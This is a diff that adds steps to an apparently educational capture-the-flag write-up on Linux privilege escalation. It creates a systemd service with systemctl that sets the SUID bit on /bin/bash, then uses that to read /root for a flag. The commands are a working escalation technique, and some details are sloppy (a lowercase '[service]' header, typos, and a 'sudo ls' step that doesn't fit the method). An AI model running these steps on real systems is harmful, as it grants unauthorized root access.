@@ -67,12 +67,33 @@ I didn't know how to exploit this so I looked it up.
 We need to create a service that can be launched by systemctl.
 First we create a temporary path for the service file : 
    `TF=$(mktemp).service`
+
+Secondly we create the content of the service :
+   `echo '[service]
+   Type=oneshot
+   ExecStart=/bin/sh -c "chmod +s /bin/bash"
+   [Install]
+   WantedBy=multi-user.target' > $TF`
+
+This will grant the has SUID.
+
+Thirdly, we link and start the service : 
+   `systemctl link $TF
+   systemctl enable --now $TF`
    
    ### 3.3 Root access
-   
+
+Now that our bash has SUID we can go the the /root folder to get the last flag : `sudo ls -la /root`.
 
 ## 4. Dead Ends and Difficulties (optional)
 
+How to use systemctl to exploit the vulnerability
+How to test different extensions.
+
 ## 5. Remediation
 
+Learnt it and explained.
+
 ## 6. Lessons Learned
+
+Same as Difficulties.
